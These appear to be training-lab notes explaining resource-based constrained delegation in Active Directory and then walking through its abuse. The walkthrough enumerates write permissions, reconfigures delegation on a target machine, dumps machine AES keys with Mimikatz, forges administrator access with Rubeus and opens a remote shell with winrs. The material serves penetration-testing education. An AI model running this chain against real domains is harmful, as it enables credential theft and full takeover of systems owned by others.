* This moves delegation authority to the resource/service administrator.
* Instead of SPNs on msDs-AllowedToDelegatTo on the front-end service like web service, access in this case is controlled by security descriptor of msDS-AllowedToActOnBehalfOfOtherIdentity (visible as PrincipalsAllowedToDelegateToAccount) on the resource/service like SQL Server service.
* That is, the resource/service administrator can configure this delegation whereas for other types, SeEnableDelegation privileges are required which are, by default, available only to Domain Admins.
* To abuse RBCD in the most effective form, we just need two privileges :

1. Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity.
2. Control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain - ms-DS-MachineAccountQuota is 10 for all domain users)

--- 

* Enumeration would show that the user 'ciadmin' has Write permissions over the dcorp-mgmt machine!
```
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```

* Using the ActiveDirectory module, configure RBCD on dcorp-mgmt for student machines :
```
$comps = 'dcorp-student1$','dcorp-student2$'
```

```
Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
```

* Now, let's get the privileges of dcorp-studentx$ by extracting its AES keys:
```
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

* Use the AES key of dcorp-studentx$ with Rubeus and access dcorp-mgmt as ANY user we want:
```
Rubeus.exe s4u /user:dcorp-student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
```

```
winrs -r:dcorp-mgmt cmd.exe
```

We will get shell


